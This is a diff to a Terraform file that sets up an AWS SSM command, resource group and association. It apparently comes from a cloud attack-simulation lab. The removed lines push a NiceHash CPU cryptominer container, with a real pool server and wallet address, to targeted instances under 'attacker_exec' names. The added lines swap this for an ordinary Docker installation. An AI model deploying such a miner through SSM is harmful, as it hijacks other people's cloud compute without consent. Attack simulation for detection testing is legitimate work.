@@ -1,40 +1,50 @@
 locals {
-    image = "a2ncer/nheqminer_cpu:latest"
-    name = "nicehash_miner"
-    server = "equihash.usa.nicehash.com:3357"
-    user = "3HotyetPPdD6pyGWtZvmMHLcXxmNuWR53C.worker1"
     payload = <<-EOT
-    LOGFILE=/tmp/attacker_exec_reverseshell_listener.log
+    LOGFILE=/tmp/ssm_deploy_docker.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
     }
     truncate -s 0 $LOGFILE
     log "Checking for docker..."
-    while ! which docker; then
-        log "docker not found - waiting"
-        sleep 10
-    done
+    if ! which docker; then
+        log "docker not found installation required"
+        sudo apt-get remove -y docker docker-engine docker.io containerd runc
+        sudo apt-get update
+        sudo apt-get install -y \
+            ca-certificates \
+            curl \
+            gnupg \
+            lsb-release
+        sudo mkdir -p /etc/apt/keyrings
+        curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+        echo \
+        "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
+        $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+        sudo apt-get update
+        sudo apt-get install -y \
+        docker-ce \
+        docker-ce-cli \
+        containerd.io \
+        docker-compose-plugin
+    fi
     log "docker path: $(which docker)"
-    if [[ `docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
-    docker run --rm -d --network=host --name ${local.name} ${local.image} -l ${local.server} -u ${local.user}
-    touch /tmp/attacker_exec_docker_cpuminer
     EOT
     base64_payload = base64encode(local.payload)
 }
 
-resource "aws_ssm_document" "exec_docker_cpuminer" {
-  name          = "exec_docker_cpuminer"
+resource "aws_ssm_document" "deploy_docker" {
+  name          = "deploy_docker"
   document_type = "Command"
 
   content = jsonencode(
     {
         "schemaVersion": "2.2",
-        "description": "start docker based cpuminer",
+        "description": "deploy docker",
         "mainSteps": [
             {
                 "action": "aws:runShellScript",
-                "name": "exec_docker_cpuminer",
+                "name": "deploy_docker",
                 "precondition": {
                     "StringEquals": [
                         "platformType",
@@ -53,11 +63,11 @@ resource "aws_ssm_document" "exec_docker_cpuminer" {
     })
 }
 
-resource "aws_resourcegroups_group" "exec_docker_cpuminer" {
-    name = "exec_docker_cpuminer"
+resource "aws_resourcegroups_group" "deploy_docker" {
+    name = "deploy_docker"
 
     resource_query {
-        query = jsonencode(var.resource_query_exec_docker_cpuminer)
+        query = jsonencode(var.resource_query_deploy_docker)
     }
 
     tags = {
@@ -66,15 +76,15 @@ resource "aws_resourcegroups_group" "exec_docker_cpuminer" {
     }
 }
 
-resource "aws_ssm_association" "exec_docker_cpuminer" {
-    association_name = "exec_docker_cpuminer"
+resource "aws_ssm_association" "deploy_docker" {
+    association_name = "deploy_docker"
 
-    name = aws_ssm_document.exec_docker_cpuminer.name
+    name = aws_ssm_document.deploy_docker.name
 
     targets {
         key = "resource-groups:Name"
         values = [
-            aws_resourcegroups_group.exec_docker_cpuminer.name,
+            aws_resourcegroups_group.deploy_docker.name,
         ]
     }
 
